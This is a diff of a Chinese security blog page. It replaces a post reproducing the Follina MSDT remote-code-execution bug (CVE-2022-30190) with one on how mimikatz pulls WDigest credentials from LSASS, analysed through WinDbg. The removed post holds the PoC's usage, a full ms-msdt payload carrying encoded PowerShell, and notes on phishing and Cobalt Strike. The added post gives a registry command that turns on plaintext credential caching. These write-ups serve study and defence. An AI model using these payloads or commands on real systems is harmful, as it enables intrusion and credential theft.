@@ -17,32 +17,21 @@
   <meta http-equiv="window-target" content="_top" />
   
   
-  <title>Windows MSDT RCE(CVE-2022-30190)复现 | Ocean&#39;s Blog</title>
-  <meta name="description" content="介绍 可利用恶意 Office 文件中的远程模板功能从远程网络服务器获取恶意 HTML 文件，通过微软支持诊断工具（Microsoft Support Diagnostic Tool，MSDT）执行恶意 PowerShell 代码。该漏洞在宏被禁用的情况下，仍然可以调用 MSDT 执行恶意代码。并且当恶意文件另存为 RTF 格式时，还可以通过 Windows 资源管理器中的预览窗格触发此 rce">
+  <title>通过WinDbg调试分析mimikatz wdigest模块 | Ocean&#39;s Blog</title>
+  <meta name="description" content="![](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;f0d15dfa21d24dc0a4b7475c382a9706-1662561065383.png) 在使用 mimikatz 经常有一个疑惑就是为什么使用简单的命令就可以提取出受 winodws 安全机制保护的密码，而且还是明文，通过这篇文章来简单梳理下其中的">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows MSDT RCE(CVE-2022-30190)复现">
-<meta property="og:url" content="https://oceansec.github.io/2022/08/13/Windows%20MSDT%20RCE(CVE-2022-30190)%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:title" content="通过WinDbg调试分析mimikatz wdigest模块">
+<meta property="og:url" content="https://oceansec.github.io/2022/09/07/%E9%80%9A%E8%BF%87WinDbg%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90mimikatz%20wdigest%E6%A8%A1%E5%9D%97/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="介绍 可利用恶意 Office 文件中的远程模板功能从远程网络服务器获取恶意 HTML 文件，通过微软支持诊断工具（Microsoft Support Diagnostic Tool，MSDT）执行恶意 PowerShell 代码。该漏洞在宏被禁用的情况下，仍然可以调用 MSDT 执行恶意代码。并且当恶意文件另存为 RTF 格式时，还可以通过 Windows 资源管理器中的预览窗格触发此 rce">
+<meta property="og:description" content="![](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;f0d15dfa21d24dc0a4b7475c382a9706-1662561065383.png) 在使用 mimikatz 经常有一个疑惑就是为什么使用简单的命令就可以提取出受 winodws 安全机制保护的密码，而且还是明文，通过这篇文章来简单梳理下其中的">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/f0d15dfa21d24dc0a4b7475c382a9706.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/b255e56ca734f37ba56985cc7d97c00e.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/52204d8d2d549cbf29c1076e3f670805.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/a74a2b4773ae44de7d5444e7a101566c.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/79a9bc8b1f3d70ec7d20b0002fffa665.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/c8c5bf8230467442fdd4de5472b6a2cd.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/532ebc7441d786f8b00d35aa3da95670.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/584e545d58843cb4274b2f59a6d15af1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/72c087a49df08f5404f692fe41ef82f1.png">
-<meta property="og:image" content="https://img-blog.csdnimg.cn/img_convert/d717a424deb896a4ca97a7f1f83da1f8.png">
-<meta property="article:published_time" content="2022-08-13T12:01:54.882Z">
-<meta property="article:modified_time" content="2022-08-13T12:34:05.513Z">
+<meta property="article:published_time" content="2022-09-07T14:28:12.479Z">
+<meta property="article:modified_time" content="2022-09-07T14:33:16.773Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="Windows">
+<meta property="article:tag" content="windows,mimikatz">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://img-blog.csdnimg.cn/f0d15dfa21d24dc0a4b7475c382a9706.png">
   <!-- Canonical links -->
-  <link rel="canonical" href="https://oceansec.github.io/2022/08/13/Windows%20MSDT%20RCE(CVE-2022-30190)%E5%A4%8D%E7%8E%B0/index.html">
+  <link rel="canonical" href="https://oceansec.github.io/2022/09/07/%E9%80%9A%E8%BF%87WinDbg%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90mimikatz%20wdigest%E6%A8%A1%E5%9D%97/index.html">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -353,14 +342,14 @@
   
 <main class="main" role="main">
   <div class="content">
-  <article id="post-Windows MSDT RCE(CVE-2022-30190)复现" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+  <article id="post-通过WinDbg调试分析mimikatz wdigest模块" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
     
     <div class="article-header">
       
         
   
     <h1 class="article-title" itemprop="name">
-      Windows MSDT RCE(CVE-2022-30190)复现
+      通过WinDbg调试分析mimikatz wdigest模块
     </h1>
   
 
@@ -368,110 +357,139 @@
       <div class="article-meta">
         <span class="article-date">
     <i class="icon icon-calendar-check"></i>
-	<a href="/2022/08/13/Windows%20MSDT%20RCE(CVE-2022-30190)%E5%A4%8D%E7%8E%B0/" class="article-date">
-	  <time datetime="2022-08-13T12:01:54.882Z" itemprop="datePublished">2022-08-13</time>
+	<a href="/2022/09/07/%E9%80%9A%E8%BF%87WinDbg%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90mimikatz%20wdigest%E6%A8%A1%E5%9D%97/" class="article-date">
+	  <time datetime="2022-09-07T14:28:12.479Z" itemprop="datePublished">2022-09-07</time>
 	</a>
 </span>
         
   <span class="article-category">
     <i class="icon icon-folder"></i>
-    <a class="article-category-link" href="/categories/%E9%92%93%E9%B1%BC/">钓鱼</a>
+    <a class="article-category-link" href="/categories/Windows/">Windows</a>
   </span>
 
         
   <span class="article-tag">
     <i class="icon icon-tags"></i>
-	<a class="article-tag-link-link" href="/tags/Windows/" rel="tag">Windows</a>
+	<a class="article-tag-link-link" href="/tags/windows-mimikatz/" rel="tag">windows,mimikatz</a>
   </span>
 
 
         
 
-        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/08/13/Windows%20MSDT%20RCE(CVE-2022-30190)%E5%A4%8D%E7%8E%B0/#comments" class="article-comment-link">评论</a></span>
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/09/07/%E9%80%9A%E8%BF%87WinDbg%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90mimikatz%20wdigest%E6%A8%A1%E5%9D%97/#comments" class="article-comment-link">评论</a></span>
         
       </div>
     </div>
     <div class="article-entry marked-body" itemprop="articleBody">
       
-        <p><img src="https://img-blog.csdnimg.cn/f0d15dfa21d24dc0a4b7475c382a9706.png"></p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
-<p>可利用恶意 Office 文件中的远程模板功能从远程网络服务器获取恶意 HTML 文件，通过微软支持诊断工具（Microsoft Support Diagnostic Tool，MSDT）执行恶意 PowerShell 代码。该漏洞在宏被禁用的情况下，仍然可以调用 MSDT 执行恶意代码。并且当恶意文件另存为 RTF 格式时，还可以通过 Windows 资源管理器中的预览窗格触发此 rce 的调用，无需执行也可以在目标机器上执行任意代码。</p>
-</blockquote>
-<p>利用 RCE 能够在非管理员权限、禁用宏且在 windows defender 开启的情况下绕过防护，达到上线的效果</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RTF是Rich Text Format的缩写，意即多文本格式。 这是一种类似DOC格式（Word文档）的文件，有很好的兼容性，使用Windows“附件”中的“写字板”就能打开并进行编辑。 使用“写字板”打开一个RTF格式文件时，将看到文件的内容；如果要查看RTF格式文件的源代码，只要使用“记事本”将它打开就行了</span><br></pre></td></tr></table></figure>
-
-<p>影响版本：</p>
-<blockquote>
-<p>目前难以全面统计该 cve 影响的Office版本，微软官方尚公布该 cve 波及的具体范围。经安天CERT分析人员验证，确认受该 cve 影响的版本如下：</p>
-<p>Microsoft Office 2013 Service Pack 1 (64-bit edition)</p>
-<p>Microsoft Office 2013 Service Pack 1 (32-bit edition)</p>
-<p>Microsoft Office 2016 (64-bit edition)</p>
-<p>Microsoft Office 2016 (32-bit edition)</p>
-<p>Microsoft Office LTSC 2021 for 32-bit edition</p>
-<p>Microsoft Office LTSC 2021 for 64-bit edition</p>
-</blockquote>
-<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>我这里复现用的版本是：office Microsoft Office LTSC 专业增强版 2021</p>
-<p>Poc：<a target="_blank" rel="noopener" href="https://github.com/chvancooten/follina.py">https://github.com/chvancooten/follina.py</a></p>
-<p>提供了很多利用方法</p>
-<p>Usage:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$ python .\follina.py -h</span><br><span class="line">usage: follina.py [-h] -m &#123;command,binary&#125; [-b BINARY] [-c COMMAND] -t &#123;rtf,docx&#125; [-u URL] [-H HOST] [-P PORT]</span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --help            show this help message and exit</span><br><span class="line"></span><br><span class="line">Required Arguments:</span><br><span class="line">  -m &#123;command,binary&#125;, --mode &#123;command,binary&#125;</span><br><span class="line">                        Execution mode, can be &quot;binary&quot; to load a (remote) binary, or &quot;command&quot; to run an encoded PS command</span><br><span class="line"></span><br><span class="line">Binary Execution Arguments:</span><br><span class="line">  -b BINARY, --binary BINARY</span><br><span class="line">                        The full path of the binary to run. Can be local or remote from an SMB share</span><br><span class="line"></span><br><span class="line">Command Execution Arguments:</span><br><span class="line">  -c COMMAND, --command COMMAND</span><br><span class="line">                        The encoded command to execute in &quot;command&quot; mode</span><br><span class="line"></span><br><span class="line">Optional Arguments:</span><br><span class="line">  -t &#123;rtf,docx&#125;, --type &#123;rtf,docx&#125;</span><br><span class="line">                        The type of payload to use, can be &quot;docx&quot; or &quot;rtf&quot;</span><br><span class="line">  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults to &quot;localhost&quot;. Disables web server if custom URL scheme or path are specified</span><br><span class="line">  -H HOST, --host HOST  The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)</span><br><span class="line">  -P PORT, --port PORT  The port to run the HTTP server on, defaults to 80</span><br></pre></td></tr></table></figure>
+        <p>![](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;f0d15dfa21d24dc0a4b7475c382a9706-1662561065383.png)</p>
+<p>在使用 mimikatz 经常有一个疑惑就是为什么使用简单的命令就可以提取出受 winodws 安全机制保护的密码，而且还是明文，通过这篇文章来简单梳理下其中的工作流程</p>
+<h1 id="Windows凭证机制"><a href="#Windows凭证机制" class="headerlink" title="Windows凭证机制"></a>Windows凭证机制</h1><h2 id="关键基础设施"><a href="#关键基础设施" class="headerlink" title="关键基础设施"></a>关键基础设施</h2><h3 id="SAM文件"><a href="#SAM文件" class="headerlink" title="SAM文件"></a>SAM文件</h3><p>SAM (安全账户管理器)，SAM 用来存储 Windows 操作系统密码的数据库文件，为了避免明文密码泄露，SAM 文件中保存的是明文密码经过一系列算法处理过的 Hash 值，被保存的 Hash 分为 <strong>LM Hash（现已废弃）、NTLMHash（长度32bit由字母数字组成）</strong>。在用户在本地或者远程登陆系统时，会将 Hash 值与 SAM 文件中保存的 Hash 值进行对比。在后期的 Windows 系统中，SAM 文件中被保存的密码 Hash 都被密钥 SYSKEY 加密</p>
 <ul>
-<li><p>执行命令</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python .\follina.py -m <span class="built_in">command</span> -c calc -t docx</span><br></pre></td></tr></table></figure>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/b255e56ca734f37ba56985cc7d97c00e.png" alt="image-20220606220321985"><br>可以通过 -c 参数指定 cs 的 powershell 代码上线 cs</p>
-</li>
-<li><p>执行二进制文件</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python follina.py -m binary -b \windows\system32\calc.exe -H 0.0.0.0 -P 8080 -t docx</span><br></pre></td></tr></table></figure></li>
+<li>SAM 文件在磁盘中的位置在：C:\windows\system32\config\sam</li>
+<li>SAM 文件在 Windows 系统启动后被系统锁定，无法进行移动和复制</li>
+<li>SAM 就是用来存放用户密码、Internet Explorer 密码，服务账号密码、SQL 密码、系统账户密码、配置的计划任务账户密码</li>
 </ul>
-<p>生成 docx 文档后点击<br><img src="https://img-blog.csdnimg.cn/img_convert/52204d8d2d549cbf29c1076e3f670805.png" alt="image-20220606215023535"></p>
-<h2 id="Poc-分析"><a href="#Poc-分析" class="headerlink" title="Poc 分析"></a>Poc 分析</h2><h3 id="分析-Python-代码"><a href="#分析-Python-代码" class="headerlink" title="分析 Python 代码"></a>分析 Python 代码</h3><p>首先根据 -H -p 参数指定的 IP 和端口生成 payload_url，url 就是生成的 exploit.html 文件位置</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/a74a2b4773ae44de7d5444e7a101566c.png" alt="image-20220606110009491"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/79a9bc8b1f3d70ec7d20b0002fffa665.png" alt="image-20220606105230171"></p>
-<p>在上面的代码中可以看到如果指定模式为 command 就会拼接<code>ms-msdt:</code>开头的字符串，然后调用 generate docx 其实就是将 payload_url 拼接到 document.xml-rels.tpl 中然后生成 word 文件</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/c8c5bf8230467442fdd4de5472b6a2cd.png" alt="image-20220606105620823"></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/532ebc7441d786f8b00d35aa3da95670.png" alt="image-20220606104815928"></p>
-<p>之前搞过 邮 件 钓 鱼 的同学都应该很清除这里的逻辑是向<code>word\_rels\document.xml.rels</code>写一个远程模板地址，<a target="_blank" rel="noopener" href="https://blog.csdn.net/q20010619/article/details/121661703">CobaltStrike使用：第三篇使用CS进行用户驱动攻击(钓鱼攻击)</a></p>
-<p>在来看一下这个 exploit.html 的具体内容，可以看到<code>ms-msdt</code>开头的字符串被拼接到了<code>&lt;script&gt;</code>标签中，然后调整转到这个伪协议</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/584e545d58843cb4274b2f59a6d15af1.png" alt="image-20220606110227146"></p>
-<h3 id="ms-msdt-协议"><a href="#ms-msdt-协议" class="headerlink" title="ms-msdt 协议"></a>ms-msdt 协议</h3><p>在注册表中找到，其 command 是<code>&quot;%SystemRoot%\system32\msdt.exe&quot; % 1</code></p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/72c087a49df08f5404f692fe41ef82f1.png" alt="image-20220606111600611"></p>
-<p>msdt.exe 是微软支持诊断工具，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/msdt">官网文档</a></p>
-<p>官网文档中给出了语法参数对照 payload</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msdt.exe /id PCWDiagnostic /skip force /param <span class="string">&quot;IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=<span class="subst">$(Invoke-Expression($(Invoke-Expression(&#x27;[System.Text.Encoding]&#x27;+[char]58+[char]58+&#x27;Unicode.GetString([System.Convert]&#x27;+[char]58+[char]58+&#x27;FromBase64String(&#x27;+[char]34+&#x27;YwBhAGwAYwA=&#x27;+[char]34+&#x27;)</span>)&#x27;))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe&quot;</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>/id PCWDiagnostic</code>表示运行 PCWDiagnostic 诊断包</li>
-</ul>
-<p>大概意思就是该部分表示要在故障排除阶段运行的脚本，发生故障即触发 payload 中的 powershell 代码</p>
-<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>禁用<code>MSDT URL</code>协议</p>
-<blockquote>
+<h3 id="Lsass进程"><a href="#Lsass进程" class="headerlink" title="Lsass进程"></a>Lsass进程</h3><p>本地安全管理局子系统服务 (LSASS) 是 Microsoft Windows 操作系统中的一个进程，负责在系统上强制执行安全策略。它验证用户登录到 Windows 计算机或服务器、处理密码更改、创建访问令牌等。我们常说的 dump lsass 就是对转存 Lsass 进程中的明文登陆密码</p>
+<h2 id="Windows认证流程"><a href="#Windows认证流程" class="headerlink" title="Windows认证流程"></a>Windows认证流程</h2><h3 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h3><p>![截屏2022-09-07 16.17.06](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;截屏2022-09-07 16.17.06.png)</p>
+<p>Window 本地登录过程如上图所示：注销或开机后：弹出登录界面，用于接受用户输入，winlogon.exe 进程用于管理用户的登录和退出，用户输入密码进行登录时发生如下操作：</p>
 <ol>
-<li><p>以管理员身份运行命令提示符</p>
+<li>winlogon.exe 进程将账号密码给 lsass.exe 进程进行处理，并将明文密码缓存在进程中</li>
+<li>lsass.exe 进程，将明文密码加密成 NTLM Hash，对 SAM 数据库比较认证</li>
+</ol>
+<p>如果比较结果相同则登录成功，不相同登录失败，分析整个过程会存在两个问题：</p>
+<ol>
+<li>lsass.exe 进程会将明文密码换存在进程中，这也是为什么低版本系统可以直接抓到明文密码的原因</li>
+<li>使用 NTLM hash 进行比较，由于 NTLM 协议没有对认证发起人进行校验，如果攻击者通过某些手段可以拿到 hash，攻击者可以通过捕获密码的 hash 值(对应着密码的值)，以此来横向访问其他网络系统，即 PTH 哈希传递攻击</li>
+</ol>
+<p>补充：除了本地认证还有基于 NTLM 协议实现的网络认证和基于 Kerberos 协议实现的域认证</p>
+<h1 id="什么是Wdigest？"><a href="#什么是Wdigest？" class="headerlink" title="什么是Wdigest？"></a>什么是Wdigest？</h1><p>WDigest  即摘要身份验证，摘要身份验证是一种质询&#x2F;响应协议，主要在 Windows Server 2003 中用于 LDAP 和基于 Web 的身份验证。它利用超文本传输协议 (HTTP) 和简单身份验证安全层 (SASL) 交换进行身份验证。WDigest 的问题是它将密码存储在内存中，并且无论是否使用它，都会将其存储在内存中</p>
+<p>在 win 7 和 2008 r2 及之前都是默认开启 Wdigest 且无法禁用，需要额外安装 KB2871997 补丁禁用 wdigest（但是 WIN7 以及 08 以后的系统中微软都默认禁止了 Wdigest 协议）</p>
+<p>所以在 win10&#x2F;server2012 及以上版本关闭 Wdigest 的情况下，抓密码需要手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 &#x3D; 截取明文密码</p>
+<p>修改注册表的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过 powershell、msf 等修改注册表</p>
+<p>关于 mimikatz 是如何实现 sekurlsa::wdigest 的代码分析可以看这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235232">调试mimikatz源码：wdigest功能源码调试详细过程及分析</a></p>
+<p>本篇文章重点关注的是通过 windbg 调试分析 mimikatz::wdigest 的实现 </p>
+<h1 id="windbg调试"><a href="#windbg调试" class="headerlink" title="windbg调试"></a>windbg调试</h1><p>Windbg 是微软开发的免费源码级调试工具。Windbg 可以用于 Kernel 模式调试和用户模式调试，还可以调试 Dump 文件</p>
+<p>官方文档及下载地址：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools">https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debugger-download-tools</a></p>
+<p>在调试 windows 时，无法简单地将 WinDBG 附加到 <code>lsass</code> 上，如果这么操作，Windows 会停止运行，警告用户系统即将重启。因此，我们需要 attach 内核，然后从 Ring-0 切换到 <code>lsass </code>进程</p>
+<h2 id="双机远程调试环境搭建"><a href="#双机远程调试环境搭建" class="headerlink" title="双机远程调试环境搭建"></a>双机远程调试环境搭建</h2><p>实验环境</p>
+<ul>
+<li>Windows 11 物理机 + windbg</li>
+<li>Windows 10 虚拟机（桥接模式）</li>
+</ul>
+<p>旧版使用com接口：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/youyudexiaowangzi/article/details/122012424">win10使用winDbg与VMware中的win7进行双机调试</a></li>
+</ul>
+<p>新版使用网络连接：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection-automatically">自动设置 KDNET 网络内核调试</a></li>
+<li><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/windows-hardware/drivers/debugger/setting-up-a-network-debugging-connection">手动设置 KDNET 网络内核调试</a></li>
+</ul>
+<p>注意：运行调试器的计算机称为 <em>主计算机</em>，正在调试的计算机称为 <em>目标计算机</em>。 使用自动设置主计算机必须运行 Windows 7 或更高版本，并且目标计算机必须 Windows 8 或更高版本运行</p>
+<p>接下来我们进行配置，我是用的是 com 串口方式连接</p>
+<ol>
+<li><p>目标虚拟机设置串口，使用命名的管道要\.\pipe\前缀，后面的名字可以自己写一个短的好记的</p>
+<p>![QQ截图20220907182836](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;QQ截图20220907182836.jpg)</p>
 </li>
-<li><p>备份注册表项后，执行命令：reg export HKEY_CLASSES_ROOT\ms-msdt filename</p>
+<li><p>目标机器内配置调试参数</p>
+<p>bcdedit根据default生成一个新的启动项，用来调试，其实通过bcdedit &#x2F;enum并没有看到default这个名字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /copy &#123;default&#125; /d &quot;vmdebug&quot;</span><br></pre></td></tr></table></figure>
+
+<p>已将该项成功复制到 {7985b4ec-581d-11ec-bee9-8214e8b021aa}</p>
+<p>复制一下这个 id，粘贴到真实机的文档里面</p>
+<p>此时重启的话会有多一个启动项选择，但是看不到，需要设置 timeout，让系统停留在启动项的选择界面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /timeout 10</span><br></pre></td></tr></table></figure>
+
+<p>设置 timeout 会在启动项选择界面停留 10 秒钟，超过 10 秒钟则进入默认启动项</p>
+<p>![QQ截图20220907195034](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;QQ截图20220907195034.jpg)</p>
+<p>重启后从 vmdebug 选项进入，设置 vmdebug 为调试模式，以免影响默认启动方式的系统环境，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /dbgsettings serial baudrate:115200 debugport:2</span><br></pre></td></tr></table></figure>
+
+<p>注意这个 debugport，就是创建虚拟机串口的端口号，从创建时的截图看，串行端口 2，debugport 应该就是 2，如果不知道。那只能先设置一个，然后连不上的时候再重新输入命令修改串口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /debug &#123;ID&#125; ON</span><br></pre></td></tr></table></figure>
+
+<p>ID是从 bcdedit &#x2F;copy 创建出 vmdebug 后生成的 id，也可以通过 bcdedit &#x2F;enum 查询</p>
+<p>重启，停在开机启动项</p>
 </li>
-<li><p>再执行命令：reg delete HKEY_CLASSES_ROOT\ms-msdt &#x2F;f</p>
+<li><p>使用 windbg 链接</p>
+<p>![QQ截图20220907184645](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;QQ截图20220907184645.jpg)</p>
+<p>如果一直提示 busy，使用 ctrl+break 键中断，87 键键盘需要（FN+Pause），进入调试器</p>
+<p>![QQ截图20220907195034](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;QQ截图20220907195034-2551663.jpg)</p>
 </li>
 </ol>
-</blockquote>
-<p>若需要撤销禁用则用管理员身份打开cmd执行：<code>reg import filename</code></p>
-<blockquote>
-<p>受本次 RCE 影响的Office版本目前不便统计，且暂无官方补丁，由此判断：该漏洞后续被利用的可能性较大。鉴于本次漏洞影响十分广泛且危害较大，安天CERT给出下列建议：</p>
+<p>TIP：</p>
 <ol>
-<li><p>谨慎下载及打开来源不明或内容可疑的文档；</p>
+<li>内核调试必须使用双机调试</li>
+<li>windbg preview 比旧版好用</li>
+<li>等系统进入输入密码界面，再 break，之后就会有 lsass 进程</li>
+</ol>
+<h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p><strong>命令行参数</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/gaochundong/p/windbg_cheat_sheet.html">WinDbg 命令手册</a></p>
+<p><a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-270324.html">windbg使用详解</a></p>
+<ol>
+<li><p>attach内核调试器后，我们需要抓取<code>lsass</code>进程的<code>EPROCESS</code>地址，可以使用如下命令<code>!process 0 0 lsass.exe</code></p>
+<p>![截屏2022-09-07 19.55.18](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;截屏2022-09-07 19.55.18-2551878.png)</p>
 </li>
-<li><p>关闭资源管理器的文件内容预览功能；</p>
+<li><p>确定<code>EPROCESS</code>地址后（<code>ffff9d01325a7080</code>），我们可以请求将调试会话切换到<code>lsass</code>进程的上下文</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.process /i /p /r ffff9d01325a7080</span><br></pre></td></tr></table></figure>
+
+<p>![截屏2022-09-07 19.58.19](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;截屏2022-09-07 19.58.19.png)</p>
 </li>
-<li><p>更新终端防病毒程序（及）病毒库；</p>
-</li>
-<li><p>禁用ms-msdt功能，并取消对应的rtf文件类型关联。</p>
+<li><p>使用<code>lm</code>命令来确定空间的访问权限</p>
+<p>![截屏2022-09-07 19.58.56](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;截屏2022-09-07 19.58.56.png)</p>
 </li>
 </ol>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11416">Follina Microsoft Office RCE with MS-MSDT Protocol</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.antiy.cn/research/notice&report/research_report/20220531.html">Microsoft Office 远程代码执行（CVE-2022-30190）风险提示</a></p>
-<p>公众号：红队蓝军，Windows支持诊断工具(MSDT)远程代码执行(CVE-2022-30190)分析复现_修复</p>
-<p><img src="https://img-blog.csdnimg.cn/img_convert/d717a424deb896a4ca97a7f1f83da1f8.png"></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86928">利用WinDbg本地内核调试器攻陷 Windows 内核</a></p>
+<p>重点：</p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8268">探索Mimikatz-第1部分-WDigest</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/180126">深入分析Mimikatz：WDigest</a></p>
+<p>开启 UseLogonCredential，查看内存中的变化</p>
+<p>![截屏2022-09-07 20.38.10](..&#x2F;..&#x2F;images&#x2F;通过WinDbg调试分析mimikatz wdigest模块&#x2F;截屏2022-09-07 20.38.10-2554472.png)</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/220991">Windows凭证机制</a></p>
 
       
     </div>
@@ -481,7 +499,7 @@
     
     <li class="post-copyright-link hidden-xs">
       <strong>本文链接：</strong>
-      <a href="https://oceansec.github.io/2022/08/13/Windows%20MSDT%20RCE(CVE-2022-30190)%E5%A4%8D%E7%8E%B0/" title="Windows MSDT RCE(CVE-2022-30190)复现" target="_blank" rel="external">https://oceansec.github.io/2022/08/13/Windows MSDT RCE(CVE-2022-30190)复现/</a>
+      <a href="https://oceansec.github.io/2022/09/07/%E9%80%9A%E8%BF%87WinDbg%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90mimikatz%20wdigest%E6%A8%A1%E5%9D%97/" title="通过WinDbg调试分析mimikatz wdigest模块" target="_blank" rel="external">https://oceansec.github.io/2022/09/07/通过WinDbg调试分析mimikatz wdigest模块/</a>
     </li>
     
     <li class="post-copyright-license">
@@ -527,10 +545,10 @@
   
   <ul class="pager pull-left">
     
-    <li class="prev">
